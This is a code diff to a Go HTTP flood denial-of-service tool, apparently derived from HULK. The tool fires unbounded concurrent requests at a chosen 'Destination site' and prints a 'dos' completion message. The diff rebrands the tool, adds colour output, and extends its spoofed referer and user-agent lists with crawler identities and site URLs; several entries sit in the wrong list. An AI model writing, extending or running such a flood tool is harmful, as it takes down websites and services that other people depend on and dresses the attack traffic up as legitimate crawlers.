@@ -15,7 +15,7 @@ import (
 	"syscall"
 )
 
-const __version__  = "9.0.9"
+const __version__  = "9.1.0"
 
 // const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
 const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
@@ -27,8 +27,14 @@ const (
 	targetComplete
 )
 
+
+
+
 // global params
 var (
+
+
+
 	safe            bool     = false
 	headersReferers []string = []string{
 		"http://www.google.com/?q=",
@@ -36,6 +42,34 @@ var (
 		"http://engadget.search.aol.com/search?q=",
 		//"http://www.google.ru/?hl=ru&q=",
 		//"http://yandex.ru/yandsearch?text=",
+		
+		"AdsBot-Google ( http://www.google.com/adsbot.html)",
+		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
+		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
+		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
+		"Googlebot-Image/1.0",
+		"Googlebot-News",
+		"Googlebot-Video/1.0",
+		
+		
+		
+		
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
+		"Accept-Encoding: gzip, deflate",
+		"Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
+		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
+		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
+		"Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
+		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
+		"Accept: text/html, application/xhtml+xml",
+		"Accept-Language: en-US,en;q=0.5",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
+		
 	}
 	headersUseragents []string = []string{
 		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
@@ -51,6 +85,22 @@ var (
 		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
 		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
 		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+	     "https://www.google.com/search?q=",
+		"https://check-host.net/",
+		"https://www.facebook.com/",
+		"https://www.youtube.com/",
+		"https://www.fbi.com/",
+		"https://www.bing.com/search?q=",
+		"https://r.search.yahoo.com/",
+		"https://www.cia.gov/index.html",
+		"https://vk.com/profile.php?auto=",
+		"https://www.usatoday.com/search/results?q=",
+		"https://help.baidu.com/searchResult?keywords=",
+		"https://steamcommunity.com/market/search?q=",
+		"https://www.ted.com/search?q=",
+		"https://play.google.com/store/search?q=",
+		
+		
 	}
 	cur int32
 )
@@ -73,13 +123,15 @@ func main() {
 		agents  string
 		data    string
 		headers arrayFlags
+		
+		
 	)
 
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
-	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
+	flag.StringVar(&data, "data", "", "Data to POST. If present will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
@@ -87,7 +139,11 @@ func main() {
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
 		maxproc = 500000000000000
+		
+		
 	}
+
+
 
 	u, err := url.Parse(site)
 	if err != nil {
@@ -96,7 +152,7 @@ func main() {
 	}
 
 	if version {
-		fmt.Println("MKRA-VIP", __version__)
+		fmt.Println("-VIP", __version__)
 		os.Exit(0)
 	}
 
@@ -127,7 +183,7 @@ func main() {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Printf("\r%6d %6d ║\t%6d ║\t%0d", cur, maxproc, sent, err)
+				fmt.Printf("\033[35m\r%6d %6d ║\t%6d ║\t%0d", cur, maxproc, sent, err)
 			}
 			switch <-ss {
 			case callExitOnErr:
@@ -140,7 +196,7 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("\033[35m\r%-6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
 				fmt.Println(" ")
 				os.Exit(0)
 			}
@@ -222,3 +278,4 @@ func buildblock(size int) (s string) {
 	}
 	return string(a)
 }
+
